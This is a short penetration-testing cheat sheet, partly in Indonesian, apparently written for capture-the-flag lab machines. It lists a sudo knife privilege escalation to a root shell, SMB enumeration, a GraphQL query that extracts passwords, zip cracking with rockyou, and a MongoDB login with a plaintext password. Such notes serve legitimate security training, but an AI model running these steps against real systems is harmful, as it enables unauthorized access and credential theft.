# get flag windows / linux

di linux cat ./flag.txt
di windows type flag.txt

# knife ruby

karna sudo -l bisa sudo nopasswd, tinggal eskalasi ke root aja via knife
cara exec code ruby:

    sudo /usr/bin/knife exec /tmp/exp.rb 

code exp.rb isinya adalah:

    system "/bin/sh" 

# SMBMAP

    smbmap -H 10.10.10.3

# SMBCLIENT

    smbclient -N //10.10.10.3/tmp

# windows hidden file
    
    ls -force

or 

    gci -force

# Graphql

query graphql: 

    http://10.10.10.121:3000/graphql?query={user{username,password}}

# fcrackzip

cracking zip

    fcrackzip -u -v -D -p ../../tools/wordlist/rockyou.txt data.zip

# Mongodb

login with user pass mongodb

    mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k

# webdav cek

    davtest -url 10.10.10.15

# creating local web server PHP

    sudo php -S 10.10.14.22:84  

# creating local web server python

    python3 -m http.server

# privesc via network command

    https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f